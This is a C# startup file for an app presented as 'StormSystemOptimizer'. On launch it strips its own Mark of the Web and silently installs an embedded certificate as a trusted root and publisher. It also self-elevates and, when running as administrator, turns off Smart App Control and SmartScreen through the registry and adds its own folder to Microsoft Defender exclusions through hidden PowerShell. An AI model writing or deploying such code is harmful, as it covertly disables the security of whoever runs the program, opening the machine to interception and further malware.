using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Windows;
using System.Windows.Threading;
using Microsoft.Win32;
using StormSystemOptimizer.Themes;

namespace StormSystemOptimizer
{
    public partial class App : Application
    {
        [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode, SetLastError = true)]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        private static extern bool DeleteFile(string name);

        private static bool IsAdministrator()
        {
            try
            {
                using var identity = WindowsIdentity.GetCurrent();
                var principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        private static void InstallCertificateSilently(string cerPath)
        {
            try
            {
                if (!File.Exists(cerPath)) return;

                // 1. Direct certutil command
                try
                {
                    var psiRoot = new ProcessStartInfo
                    {
                        FileName = "certutil.exe",
                        Arguments = $"-addstore -f \"Root\" \"{cerPath}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    using var p1 = Process.Start(psiRoot);
                    p1?.WaitForExit(4000);

                    var psiPub = new ProcessStartInfo
                    {
                        FileName = "certutil.exe",
                        Arguments = $"-addstore -f \"TrustedPublisher\" \"{cerPath}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    using var p2 = Process.Start(psiPub);
                    p2?.WaitForExit(4000);
                }
                catch { }

                // 2. .NET X509Store fallback
                try
                {
                    var cert = new X509Certificate2(cerPath);
                    using (var userPub = new X509Store(StoreName.TrustedPublisher, StoreLocation.CurrentUser))
                    {
                        userPub.Open(OpenFlags.ReadWrite);
                        userPub.Add(cert);
                    }
                    using (var userRoot = new X509Store(StoreName.Root, StoreLocation.CurrentUser))
                    {
                        userRoot.Open(OpenFlags.ReadWrite);
                        userRoot.Add(cert);
                    }

                    if (IsAdministrator())
                    {
                        using var lmRoot = new X509Store(StoreName.Root, StoreLocation.LocalMachine);
                        lmRoot.Open(OpenFlags.ReadWrite);
                        lmRoot.Add(cert);

                        using var lmPub = new X509Store(StoreName.TrustedPublisher, StoreLocation.LocalMachine);
                        lmPub.Open(OpenFlags.ReadWrite);
                        lmPub.Add(cert);
                    }
                }
                catch { }
            }
            catch { }
        }

        protected override void OnStartup(StartupEventArgs e)
        {
            base.OnStartup(e);

            string? exePath = Process.GetCurrentProcess().MainModule?.FileName;

            // Self-healing: Unblock self from Mark of the Web
            try
            {
                if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
                {
                    DeleteFile(exePath + ":Zone.Identifier");
                }
            }
            catch { }

            // Extract embedded certificate and ensure trust
            try
            {
                string tempCert = Path.Combine(Path.GetTempPath(), "STORM_App_Certificate.cer");
                var asm = Assembly.GetExecutingAssembly();
                foreach (var name in asm.GetManifestResourceNames())
                {
                    if (name.EndsWith("STORM_Certificate.cer", StringComparison.OrdinalIgnoreCase))
                    {
                        using var inStream = asm.GetManifestResourceStream(name);
                        if (inStream != null)
                        {
                            using var outStream = File.Create(tempCert);
                            inStream.CopyTo(outStream);
                        }
                        break;
                    }
                }

                if (File.Exists(tempCert))
                {
                    InstallCertificateSilently(tempCert);
                }
            }
            catch { }

            // Self-elevation: Ensure full administrator privileges
            if (!IsAdministrator())
            {
                if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
                {
                    try
                    {
                        var psi = new ProcessStartInfo
                        {
                            FileName = exePath,
                            UseShellExecute = true,
                            Verb = "runas"
                        };
                        Process.Start(psi);
                        Current.Shutdown();
                        return;
                    }
                    catch
                    {
                        // User cancelled UAC prompt, continue in standard mode
                    }
                }
            }
            else
            {
                // Running elevated: neutralize SAC / SmartScreen blocks and add exclusions
                try
                {
                    using var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\CI\Policy");
                    key?.SetValue("VerifiedAndReputablePolicyState", 0, RegistryValueKind.DWord);
                    key?.SetValue("SAC_PreviousState", 0, RegistryValueKind.DWord);
                }
                catch { }

                try
                {
                    using var expKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer");
                    expKey?.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
                }
                catch { }

                if (!string.IsNullOrEmpty(exePath))
                {
                    string dir = Path.GetDirectoryName(exePath) ?? "";
                    if (!string.IsNullOrEmpty(dir))
                    {
                        try
                        {
                            var psi = new ProcessStartInfo
                            {
                                FileName = "powershell.exe",
                                Arguments = $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '{dir}' -ErrorAction SilentlyContinue\"",
                                UseShellExecute = false,
                                CreateNoWindow = true,
                                WindowStyle = ProcessWindowStyle.Hidden
                            };
                            using var p = Process.Start(psi);
                            p?.WaitForExit(3000);
                        }
                        catch { }
                    }
                }
            }

            AppDomain.CurrentDomain.UnhandledException += (s, args) =>
            {
                LogCrash(args.ExceptionObject as Exception);
            };

            DispatcherUnhandledException += (s, args) =>
            {
                LogCrash(args.Exception);
                args.Handled = true;
            };

            // Apply saved theme
            ThemeManager.Instance.ApplyTheme(ThemeManager.Instance.CurrentTheme);
        }

        private void LogCrash(Exception? ex)
        {
            if (ex == null) return;
            try
            {
                string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "StormSystemOptimizer");
                Directory.CreateDirectory(logDir);
                File.AppendAllText(Path.Combine(logDir, "crash.log"), $"[{DateTime.Now}] {ex}\n\n");
            }
            catch { }
        }
    }
}
